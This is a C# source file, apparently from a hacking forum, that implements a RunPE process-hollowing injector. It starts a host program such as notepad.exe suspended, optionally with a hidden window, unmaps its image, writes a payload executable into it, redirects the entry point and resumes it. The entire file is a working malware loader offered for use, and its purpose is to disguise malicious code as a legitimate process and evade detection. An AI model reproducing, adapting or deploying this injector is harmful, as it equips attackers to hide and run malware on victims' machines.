// C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /platform:x86 /unsafe /out:WinXRunPE.exe WinXRunPE.cs

using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HackForums.gigajew
{
    public class WinXParameters
    {
        public byte[] Payload;
        public string HostFileName;
        public string[] Arguments;
        public bool Hidden;

        public static WinXParameters Create(byte[] payload, string hostFileName, bool hidden, params string[] arguments)
        {
            WinXParameters parameters = new WinXParameters();
            parameters.HostFileName = hostFileName;
            parameters.Payload = payload;
            parameters.Arguments = arguments;
            parameters.Hidden = hidden;
            return parameters;
        }

        public string GetFormattedHostFileName()
        {
            if (Arguments != null)
            {
                if (Arguments.Length > 0)
                {
                    return string.Format("{0} {1}", HostFileName, string.Join(" ", Arguments));
                }
            }
            return HostFileName;
        }
    }

    public static unsafe class WinXRunPE
    {
        public static bool Inject(WinXParameters parameters)
        {
            bool emulatedi386 = false;

            string currentDir;
            var entry = Assembly.GetEntryAssembly();
            if (entry != null)
                currentDir = Path.GetDirectoryName(entry.Location);
            else
                currentDir = Directory.GetCurrentDirectory();

            ProcessInfo processInfo = new ProcessInfo();
            _CONTEXT context = new _CONTEXT();
            context.ContextFlags = 0x10001b;

            fixed (byte* pBufferUnsafe = parameters.Payload)
            {
                IntPtr pBuffer = (IntPtr)pBufferUnsafe;
                _IMAGE_DOS_HEADER* dosHeader = (_IMAGE_DOS_HEADER*)(pBufferUnsafe);
                _IMAGE_NT_HEADERS* ntHeaders = (_IMAGE_NT_HEADERS*)(pBufferUnsafe + (dosHeader->e_lfanew));

                if (dosHeader->e_magic != 0x5A4D || ntHeaders->Signature != 0x00004550)
                {
                    throw new Win32Exception("Not a valid Win32 PE!");
                }

                if (ntHeaders->OptionalHeader.Magic != 0x10b)
                {
                    throw new Exception("This RunPE only supports i386-built executables!");
                }

                // patch subsystem
                Buffer.SetByte(parameters.Payload, 0x398, 0x2);

                STARTUPINFO startupInfo = new STARTUPINFO();
                startupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));

                if (!CreateProcess(null, parameters.GetFormattedHostFileName(), IntPtr.Zero, IntPtr.Zero, false, parameters.Hidden ? 0x00000004u | 0x08000000u : 0x00000004u, IntPtr.Zero, currentDir, &startupInfo, &processInfo))
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] CreateProcess failed with error: " + err);
                    if (processInfo.hProcess != IntPtr.Zero)
                    {
                        TerminateProcess(processInfo.hProcess, -1);
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                    }
                    return false;
                }

                // Console.WriteLine("[+] Created suspended process, PID handle: 0x" + processInfo.hProcess.ToString("X"));
				Console.WriteLine("[+] Created suspended process");
				Console.WriteLine("    PID:  " + processInfo.dwProcessId);
				Console.WriteLine("    TID:  " + processInfo.dwThreadId);
				Console.WriteLine("    hProc: 0x" + processInfo.hProcess.ToString("X"));
				Console.WriteLine("    hThrd: 0x" + processInfo.hThread.ToString("X"));

                IsWow64Process(processInfo.hProcess, ref emulatedi386);
                Console.WriteLine("[*] WoW64: " + emulatedi386);

                IntPtr pImageBase = (IntPtr)(ntHeaders->OptionalHeader.ImageBase);
                Console.WriteLine("[*] Target ImageBase: 0x" + pImageBase.ToString("X"));

                NtUnmapViewOfSection(processInfo.hProcess, pImageBase);

                if (VirtualAllocEx(processInfo.hProcess, pImageBase, ntHeaders->OptionalHeader.SizeOfImage, 0x3000u, 0x40u) == IntPtr.Zero)
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] VirtualAllocEx failed with error: " + err);
                    TerminateProcess(processInfo.hProcess, -1);
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    return false;
                }

                Console.WriteLine("[+] Allocated 0x" + ntHeaders->OptionalHeader.SizeOfImage.ToString("X") + " bytes at 0x" + pImageBase.ToString("X"));

                if (!WriteProcessMemory(processInfo.hProcess, pImageBase, pBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, IntPtr.Zero))
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] WriteProcessMemory (headers) failed with error: " + err);
                    TerminateProcess(processInfo.hProcess, -1);
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    return false;
                }

                Console.WriteLine("[+] Wrote PE headers");

                for (ushort i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
                {
                    _IMAGE_SECTION_HEADER* section = (_IMAGE_SECTION_HEADER*)(pBuffer.ToInt64() + (dosHeader->e_lfanew) + Marshal.SizeOf(typeof(_IMAGE_NT_HEADERS)) + (Marshal.SizeOf(typeof(_IMAGE_SECTION_HEADER)) * i));

                    Console.WriteLine("[*] Writing section " + i + ": VA=0x" + section->VirtualAddress.ToString("X") + " Size=0x" + section->SizeOfRawData.ToString("X"));

                    if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(pImageBase.ToInt64() + (section->VirtualAddress)), (IntPtr)(pBuffer.ToInt64() + (section->PointerToRawData)), section->SizeOfRawData, IntPtr.Zero))
                    {
                        int err = Marshal.GetLastWin32Error();
                        Console.WriteLine("[!] WriteProcessMemory (section " + i + ") failed with error: " + err);
                        TerminateProcess(processInfo.hProcess, -1);
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                        return false;
                    }
                }

                if (emulatedi386)
                {
                    if (!Wow64GetThreadContext(processInfo.hThread, &context))
                    {
                        int err = Marshal.GetLastWin32Error();
                        Console.WriteLine("[!] Wow64GetThreadContext failed with error: " + err);
                        TerminateProcess(processInfo.hProcess, -1);
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                        return false;
                    }
                }
                else
                {
                    if (!GetThreadContext(processInfo.hThread, &context))
                    {
                        int err = Marshal.GetLastWin32Error();
                        Console.WriteLine("[!] GetThreadContext failed with error: " + err);
                        TerminateProcess(processInfo.hProcess, -1);
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                        return false;
                    }
                }

                Console.WriteLine("[+] Got thread context: EAX=0x" + context.Eax.ToString("X") + " EBX=0x" + context.Ebx.ToString("X"));

                IntPtr address = Marshal.AllocHGlobal(8);
                ulong puImageBase = (ulong)pImageBase.ToInt64();
                byte[] pbImageBase = new byte[8];
                pbImageBase[0] = (byte)(puImageBase >> 0);
                pbImageBase[1] = (byte)(puImageBase >> 8);
                pbImageBase[2] = (byte)(puImageBase >> 16);
                pbImageBase[3] = (byte)(puImageBase >> 24);
                pbImageBase[4] = (byte)(puImageBase >> 32);
                pbImageBase[5] = (byte)(puImageBase >> 40);
                pbImageBase[6] = (byte)(puImageBase >> 48);
                pbImageBase[7] = (byte)(puImageBase >> 56);
                Marshal.Copy(pbImageBase, 0, address, 8);

                Console.WriteLine("[*] Patching PEB ImageBase at EBX+8 = 0x" + (context.Ebx + 8).ToString("X"));

                if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(context.Ebx + 8ul), address, 4u, IntPtr.Zero))
                {
                    Marshal.FreeHGlobal(address);
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[!] WriteProcessMemory (PEB patch) failed with error: " + err);
                    TerminateProcess(processInfo.hProcess, -1);
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                    return false;
                }
                Marshal.FreeHGlobal(address);

                context.Eax = (uint)(pImageBase.ToInt64() + (ntHeaders->OptionalHeader.AddressOfEntryPoint));
                Console.WriteLine("[+] New EntryPoint: EAX=0x" + context.Eax.ToString("X"));

                if (emulatedi386)
                {
                    if (!Wow64SetThreadContext(processInfo.hThread, &context))
                    {
                        int err = Marshal.GetLastWin32Error();
                        Console.WriteLine("[!] Wow64SetThreadContext failed with error: " + err);
                        TerminateProcess(processInfo.hProcess, -1);
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                        return false;
                    }
                }
                else
                {
                    if (!SetThreadContext(processInfo.hThread, &context))
                    {
                        int err = Marshal.GetLastWin32Error();
                        Console.WriteLine("[!] SetThreadContext failed with error: " + err);
                        TerminateProcess(processInfo.hProcess, -1);
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                        return false;
                    }
                }

                ResumeThread(processInfo.hThread);
                Console.WriteLine("[+] Thread resumed");

                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);
                return true;

            }
        }

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CreateProcess(
            [MarshalAs(UnmanagedType.LPTStr)]string lpApplicationName,
            [MarshalAs(UnmanagedType.LPTStr)]string lpCommandLine,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpProcessAttributes,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpThreadAttributes,
            [MarshalAs(UnmanagedType.Bool)]bool bInheritHandles,
            [MarshalAs(UnmanagedType.U4)]uint dwCreationFlags,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpEnvironment,
            [MarshalAs(UnmanagedType.LPTStr)]string lpCurrentDirectory,
            STARTUPINFO* lpStartupInfo,
            ProcessInfo* lpProcessInfo);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool TerminateProcess([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess, [MarshalAs(UnmanagedType.I4)]int exitCode);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle([MarshalAs(UnmanagedType.SysInt)]IntPtr hObject);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool Wow64GetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool Wow64SetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT* pContext);

        [DllImport("ntdll.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.U4)]
        private static extern uint NtUnmapViewOfSection([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess, [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.SysInt)]
        private static extern IntPtr VirtualAllocEx(
            [MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpAddress,
            [MarshalAs(UnmanagedType.U4)]uint dwSize,
            [MarshalAs(UnmanagedType.U4)]uint flAllocationType,
            [MarshalAs(UnmanagedType.U4)]uint flProtect);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool WriteProcessMemory(
            [MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBaseAddress,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBuffer,
            [MarshalAs(UnmanagedType.U4)]uint nSize,
            [MarshalAs(UnmanagedType.SysInt)]IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.U4)]
        private static extern uint ResumeThread([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)]ref bool isWow64);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
	public struct ProcessInfo
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public uint dwProcessId;
		public uint dwThreadId;
	}

    [StructLayout(LayoutKind.Explicit, Size = 0x28)]
    public struct _IMAGE_SECTION_HEADER
    {
        [FieldOffset(0xc)]
        public UInt32 VirtualAddress;
        [FieldOffset(0x10)]
        public UInt32 SizeOfRawData;
        [FieldOffset(0x14)]
        public UInt32 PointerToRawData;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x14)]
    public struct _IMAGE_FILE_HEADER
    {
        [FieldOffset(0x02)]
        public ushort NumberOfSections;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x40)]
    public struct _IMAGE_DOS_HEADER
    {
        [FieldOffset(0x00)]
        public ushort e_magic;
        [FieldOffset(0x3c)]
        public uint e_lfanew;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0xf8)]
    public struct _IMAGE_NT_HEADERS
    {
        [FieldOffset(0x00)]
        public uint Signature;
        [FieldOffset(0x04)]
        public _IMAGE_FILE_HEADER FileHeader;
        [FieldOffset(0x18)]
        public _IMAGE_OPTIONAL_HEADER OptionalHeader;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0xe0)]
    public struct _IMAGE_OPTIONAL_HEADER
    {
        [FieldOffset(0x00)]
        public ushort Magic;
        [FieldOffset(0x010)]
        public uint AddressOfEntryPoint;
        [FieldOffset(0x1c)]
        public uint ImageBase;
        [FieldOffset(0x38)]
        public uint SizeOfImage;
        [FieldOffset(0x3c)]
        public uint SizeOfHeaders;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x2cc)]
    public struct _CONTEXT
    {
        [FieldOffset(0x00)]
        public uint ContextFlags;
        [FieldOffset(0xa4)]
        public uint Ebx;
        [FieldOffset(0xb0)]
        public uint Eax;
    }

    public class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: WinXRunPE.exe <payload.exe> <host.exe>");
                Console.WriteLine("Example: WinXRunPE.exe payload.exe C:\\Windows\\SysWOW64\\notepad.exe");
                return;
            }

            string payloadPath = args[0];
            string hostPath = args[1];

            if (!File.Exists(payloadPath))
            {
                Console.WriteLine("[-] Payload file not found: " + payloadPath);
                return;
            }

            if (!File.Exists(hostPath))
            {
                Console.WriteLine("[-] Host file not found: " + hostPath);
                return;
            }

            Console.WriteLine("[*] Payload: " + payloadPath);
            Console.WriteLine("[*] Host:    " + hostPath);

            byte[] payload = File.ReadAllBytes(payloadPath);
            Console.WriteLine("[*] Payload size: " + payload.Length + " bytes");

            WinXParameters parameters = WinXParameters.Create(
                payload,
                hostPath,
                false
            );

            try
            {
                bool result = WinXRunPE.Inject(parameters);
                if (result)
                    Console.WriteLine("[+] Injection successful");
                else
                    Console.WriteLine("[-] Injection failed");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Exception: " + ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }
    }
}